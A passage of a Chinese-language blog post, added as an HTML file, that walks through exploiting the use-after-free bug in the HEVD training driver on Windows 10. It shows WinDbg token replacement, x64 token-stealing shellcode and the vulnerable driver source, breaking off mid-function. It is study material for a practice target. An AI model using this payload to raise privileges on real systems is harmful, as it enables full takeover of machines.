@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HEVD-UAF - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+Windows Kernel NonPagedPool UAF
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="HEVD-UAF" />
+<meta property="og:description" content="
+Windows Kernel NonPagedPool UAF
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/hevd-uaf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-02-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HEVD-UAF"/>
+<meta name="twitter:description" content="
+Windows Kernel NonPagedPool UAF
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">HEVD-UAF</h1>
+			<div class="meta">Posted on Feb 7, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>Windows Kernel NonPagedPool UAF</p>
+</blockquote>
+<p>win10 22h2</p>
+<p>相关代码在仓库<a href="https://github.com/ldrx30/HEVDExploits">HEVDExploits</a></p>
+<h2 id="编译项目">编译项目</h2>
+<p>运行<code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p>
+<p>或者VS打开项目，编译。</p>
+<ul>
+<li>属性-&gt;DriverSetting 先设置为win7/win10，生成x64</li>
+</ul>
+<h2 id="windows-api">Windows API</h2>
+<p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code> 是一个用于在Windows内核开发中指定函数所属代码段属性的编译指令。</p>
+<ul>
+<li><code>#pragma alloc_text</code> 是一个预处理指令，用于在编译时将函数指定到特定的代码段。</li>
+<li><code>PAGE</code> 是<code>#pragma alloc_text</code> 指令后面的参数，用于指定函数所属的代码段。<code>PAGE</code> 表示该函数应该被编译为适用于页码页面的代码段。</li>
+</ul>
+<p>ExAllocatePoolWithTag: 分配指定类型的池内存，并返回指向已分配块的指针</p>
+<ul>
+<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PVOID <span style="color:#50fa7b">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span>  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span style="color:#6272a4">// 要分配的池内存的类型，POOL_TYPE 枚举
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in] SIZE_T                                         NumberOfBytes,    <span style="color:#6272a4">// 要分配的字节数
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in] ULONG                                          Tag               <span style="color:#6272a4">// 要用于已分配内存的池标记，字符串通常按反向顺序指定
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>); 
+</span></span></code></pre></div><p>windows 内存管理器创建系统用于分配内存的以下内存池：非分页池和分页池。 这两个内存池都位于为系统保留并映射到每个进程的虚拟地址空间的地址空间区域中。内核池类似于Windows 中的堆, 因为它的作用也是用来动态分配内存</p>
+<ul>
+<li>非分页池由虚拟内存地址组成，只要分配了相应的内核对象，这些地址就保证驻留在物理内存中。</li>
+<li>分页池由虚拟内存组成，可以分页进出系统。</li>
+<li><strong>PagedPool</strong>简单来说就是物理内存不够时，会把这片内存移动到硬盘上，而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。</li>
+</ul>
+<p>ExFreePoolWithTag: 释放池内存</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">ExFreePoolWithTag</span>(
+</span></span><span style="display:flex;"><span>  [in] PVOID P,
+</span></span><span style="display:flex;"><span>  [in] ULONG Tag
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>NtAllocateReserveObject：ntdll中系统调用。负责在内核端创建保留对象–在内核池上执行内存分配，返回Handle</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS STDCALL NtAllocateReserveObject(
+</span></span><span style="display:flex;"><span>    OUT PHANDLE hObject,
+</span></span><span style="display:flex;"><span>    IN POBJECT_ATTRIBUTES ObjectAttributes,
+</span></span><span style="display:flex;"><span>    IN DWORD ObjectType 
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><h2 id="驱动层权限提升">驱动层权限提升</h2>
+<p>内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p>
+<p>Windows提权：获取 <code>nt authority\system</code>权限</p>
+<ul>
+<li>将SYSTEM进程的token复制到当前进程，这样当前进程则为system权限<a href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a>。</li>
+<li>编辑ACL/ACE 或者 直接修改token中的<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了<a href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li>
+</ul>
+<h3 id="测试">测试</h3>
+<p>首先找到System进程的16进制地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; !dml_proc
+</span></span><span style="display:flex;"><span>Address           PID  Image file name
+</span></span><span style="display:flex;"><span>ffff940f`cfea7080 4    System
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>ffff940f`d7240080 2270 cmd.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0: kd&gt; !process 0 0 system
+</span></span><span style="display:flex;"><span>PROCESS ffff940fcfea7080
+</span></span><span style="display:flex;"><span>    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+</span></span><span style="display:flex;"><span>    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.
+</span></span><span style="display:flex;"><span>    Image: System
+</span></span></code></pre></div><p>它指向一个<code>_EPROCESS</code>结构，查看，一个比较大的结构体</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; dt _EPROCESS ffff940f`cfea7080
+</span></span><span style="display:flex;"><span>ntdll!_EPROCESS
+</span></span><span style="display:flex;"><span>   +0x000 Pcb              : _KPROCESS
+</span></span><span style="display:flex;"><span>   +0x438 ProcessLock      : _EX_PUSH_LOCK
+</span></span><span style="display:flex;"><span>   +0x440 UniqueProcessId  : 0x00000000`00000004 Void
+</span></span><span style="display:flex;"><span>   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]
+</span></span><span style="display:flex;"><span>   +0x458 RundownProtect   : _EX_RUNDOWN_REF
+</span></span><span style="display:flex;"><span>   ...
+</span></span><span style="display:flex;"><span>   +0x4b8 Token            : _EX_FAST_REF
+</span></span><span style="display:flex;"><span>   ...
+</span></span></code></pre></div><p>可以看到token偏移（根据系统进行变化，并且token字段是以<code>_EX_FAST_REF</code>来声明的而不是<code>_TOKEN</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; dq ffffe78dfac04800+4b8 L1
+</span></span><span style="display:flex;"><span>ffffe78d`fac04cb8  ffffe78d`fac0c05e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8
+</span></span><span style="display:flex;"><span>ntdll!_EX_FAST_REF
+</span></span><span style="display:flex;"><span>   +0x000 Object           : 0xffffe78d`fac0c05e Void
+</span></span><span style="display:flex;"><span>   +0x000 RefCnt           : 0y1110
+</span></span><span style="display:flex;"><span>   +0x000 Value            : 0xffffe78d`fac0c05e
+</span></span></code></pre></div><p>蓝屏警告：这个 <code>token</code> 后四位全为0才是token</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; !token ffffe78d`fac0c050
+</span></span></code></pre></div><p>定位cmd.exe进程的<code>_EPROCESS</code>结构并替换偏移0x208的token指针值为System的token地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; !process 0 0 cmd.exe
+</span></span><span style="display:flex;"><span>PROCESS ffff940fd7240080
+</span></span><span style="display:flex;"><span>    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc
+</span></span><span style="display:flex;"><span>    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.
+</span></span><span style="display:flex;"><span>    Image: cmd.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080
+</span></span><span style="display:flex;"><span>ntdll!_EX_FAST_REF
+</span></span><span style="display:flex;"><span>   +0x000 Object           : 0xffffe78e`02dcb06b Void
+</span></span><span style="display:flex;"><span>   +0x000 RefCnt           : 0y1011
+</span></span><span style="display:flex;"><span>   +0x000 Value            : 0xffffe78e`02dcb06b
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050
+</span></span><span style="display:flex;"><span>0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080
+</span></span><span style="display:flex;"><span>ntdll!_EX_FAST_REF
+</span></span><span style="display:flex;"><span>   +0x000 Object           : 0xffffe78d`fac0c05e Void
+</span></span><span style="display:flex;"><span>   +0x000 RefCnt           : 0y1110
+</span></span><span style="display:flex;"><span>   +0x000 Value            : 0xffffe78d`fac0c05e
+</span></span><span style="display:flex;"><span>0: kd&gt; g
+</span></span></code></pre></div><p>替换成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:<span style="color:#8be9fd;font-style:italic">\Users\debugger</span><span style="color:#6272a4">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>desktop-8h64pu1\debugger
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># WinDbg替换
+</span></span><span style="display:flex;"><span>C:<span style="color:#8be9fd;font-style:italic">\Users\debugger</span><span style="color:#6272a4">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><h3 id="shellcode">shellcode</h3>
+<p>寻找 <code>_KTHREAD</code> 结构：反汇编 <code>PsGetCurrentThread</code> 函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; uf PsGetCurrentProcess 
+</span></span><span style="display:flex;"><span>nt!PsGetCurrentProcess:
+</span></span><span style="display:flex;"><span>fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]
+</span></span><span style="display:flex;"><span>fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]
+</span></span><span style="display:flex;"><span>fffff801`3f68eeb0 c3              ret
+</span></span></code></pre></div><p>其实<code>gs:[188h]</code>的位置存贮的是 <code>_KTHREAD</code> 结构的地址，看一下这个结构，发现0x220的位置存储的就是 <code>_KPROCESS</code>，但是这里是取得 <code>0xb8</code>, 0x98其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; dt _KTHREAD
+</span></span><span style="display:flex;"><span>   ...
+</span></span><span style="display:flex;"><span>   +0x098 ApcStateFill     : [43] UChar
+</span></span><span style="display:flex;"><span>   +0x0c3 Priority         : Char
+</span></span><span style="display:flex;"><span>   ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0: kd&gt; dt _KAPC_STATE
+</span></span><span style="display:flex;"><span>ntdll!_KAPC_STATE
+</span></span><span style="display:flex;"><span>   +0x000 ApcListHead      : [2] _LIST_ENTRY
+</span></span><span style="display:flex;"><span>   +0x020 Process          : Ptr64 _KPROCESS
+</span></span><span style="display:flex;"><span>   +0x028 InProgressFlags  : UChar
+</span></span><span style="display:flex;"><span>   +0x028 KernelApcInProgress : Pos 0, 1 Bit
+</span></span><span style="display:flex;"><span>   +0x028 SpecialApcInProgress : Pos 1, 1 Bit
+</span></span><span style="display:flex;"><span>   +0x029 KernelApcPending : UChar
+</span></span><span style="display:flex;"><span>   +0x02a UserApcPendingAll : UChar
+</span></span><span style="display:flex;"><span>   +0x02a SpecialUserApcPending : Pos 0, 1 Bit
+</span></span><span style="display:flex;"><span>   +0x02a UserApcPending   : Pos 1, 1 Bit
+</span></span></code></pre></div><p>因此在r3寻找到 <code>_KPROCESS </code>的实现</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>mov r9, qword ptr <span style="color:#8be9fd;font-style:italic">gs</span>:[<span style="color:#bd93f9">0x188</span>]  
+</span></span><span style="display:flex;"><span>mov r9, qword ptr[r9<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0B8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 或者
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>mov r9, qword ptr <span style="color:#8be9fd;font-style:italic">gs</span>:[<span style="color:#bd93f9">0x188</span>]  
+</span></span><span style="display:flex;"><span>mov r9, qword ptr[r9<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x220</span>]
+</span></span></code></pre></div><p><code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的，我们可以通过dt来查看</p>
+<ul>
+<li>内核用来跟踪进程的结构是KPROCESS。 执行子系统用来跟踪它的结构是EPROCESS。 作为一个实现细节，KPROCESS是EPROCESS的第一个字段，所以执行子系统分配EPROCESS结构，然后调用coreel来初始化它的KPROCESS部分。最后，这两个结构都是表示用户进程实例的Process Object的一部分。</li>
+<li>在<a href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a>寻找答案</li>
+</ul>
+<p>第一个元素就是 <code>_KPROCESS</code>, <code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; dt _EPROCESS
+</span></span><span style="display:flex;"><span>ntdll!_EPROCESS
+</span></span><span style="display:flex;"><span>   +0x000 Pcb              : _KPROCESS
+</span></span><span style="display:flex;"><span>   +0x438 ProcessLock      : _EX_PUSH_LOCK
+</span></span><span style="display:flex;"><span>   +0x440 UniqueProcessId  : Ptr64 Void
+</span></span><span style="display:flex;"><span>   +0x448 ActiveProcessLinks : _LIST_ENTRY
+</span></span><span style="display:flex;"><span>   ...
+</span></span><span style="display:flex;"><span>   +0x540 InheritedFromUniqueProcessId : Ptr64 Void
+</span></span><span style="display:flex;"><span>   +0x548 OwnerProcessId   : Uint8B
+</span></span><span style="display:flex;"><span>   ...
+</span></span></code></pre></div><p>因为程序大多数在cmd.exe启动，因此我们获得的是 cmd 的 <code>_KPROCESS</code>，我们需要替换的是这个，我们需要寻找到system进程token</p>
+<p>链表元素就是 <code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到system(pid=4)的<code>_KPROCESS</code>。参考<a href="https://bbs.kanxue.com/thread-224058-1.htm">这里</a>，修改偏移为当前系统的</p>
+<ul>
+<li>EPROCESS 在 KTHREAD + 0xb8</li>
+<li>ActiveProcessLinks 在 EPROCESS + 0x448</li>
+<li>ActiveProcessLinks 距离 Token 距离</li>
+<li>token 在 EPROCESS + 0x4b8 处</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>    mov rdx, [<span style="color:#8be9fd;font-style:italic">gs</span>:<span style="color:#bd93f9">188</span>h]       ;get _ETHREAD pointer from KPCR
+</span></span><span style="display:flex;"><span>    mov r8, [rdx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)
+</span></span><span style="display:flex;"><span>    mov r9, [r8<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x448</span>]       ;ActiveProcessLinks list head
+</span></span><span style="display:flex;"><span>    mov rcx, [r9]            ;follow link to first process in list
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">find_system_proc</span>:
+</span></span><span style="display:flex;"><span>    mov rdx, [rcx<span style="color:#ff79c6">-</span><span style="color:#bd93f9">8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId
+</span></span><span style="display:flex;"><span>    cmp rdx, <span style="color:#bd93f9">4</span>               ;process with ID <span style="color:#bd93f9">4</span> is System process
+</span></span><span style="display:flex;"><span>    jz found_it
+</span></span><span style="display:flex;"><span>    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer
+</span></span><span style="display:flex;"><span>    cmp rcx, r9              ;see <span style="color:#ff79c6">if</span> back at list head
+</span></span><span style="display:flex;"><span>    jnz find_system_proc
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">found_it</span>:
+</span></span><span style="display:flex;"><span>    mov rax, [rcx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x80</span>]      ;offset from ActiveProcessLinks to Token
+</span></span><span style="display:flex;"><span>    and al, <span style="color:#bd93f9">0xf0</span>             ;clear low <span style="color:#bd93f9">4</span> bits of _EX_FAST_REF structure
+</span></span><span style="display:flex;"><span>    mov [r8<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x4b8</span>], rax      ;replace current process token with system token
+</span></span><span style="display:flex;"><span>    ret
+</span></span></code></pre></div><h2 id="寻找合适的对象">寻找合适的对象</h2>
+<p>池喷射需要找到适合大小的内核对象以及池对象，使用windbg分析</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>!object \ObjectTypes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dt nt!_OBJECT_TYPE &lt;addr&gt;
+</span></span><span style="display:flex;"><span>dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;
+</span></span></code></pre></div><h2 id="源码审计">源码审计</h2>
+<p>在存在漏洞的驱动里，对象free后没有置为NULL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">FreeUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span>    VOID
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    NTSTATUS Status <span style="color:#ff79c6">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PAGED_CODE();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__try</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (g_UseAfterFreeObjectNonPagedPool)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Freeing UaF Object</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Tag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, STRINGIFY(POOL_TAG));
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef SECURE
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// Secure Note: This is secure because the developer is setting
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL once the Pool chunk is being freed
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// Set to NULL to avoid dangling pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>            g_UseAfterFreeObjectNonPagedPool <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// Vulnerability Note: This is a vanilla Use After Free vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// because the developer is not setting &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// (dangling pointer)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span>            Status <span style="color:#ff79c6">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        Status <span style="color:#ff79c6">=</span> GetExceptionCode();
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[-] Exception Code: 0x%X</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> Status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后就可以UAF调用callback函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">UseUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span>    VOID
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    NTSTATUS Status <span style="color:#ff79c6">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PAGED_CODE();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__try</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (g_UseAfterFreeObjectNonPagedPool)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Using UaF Object</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
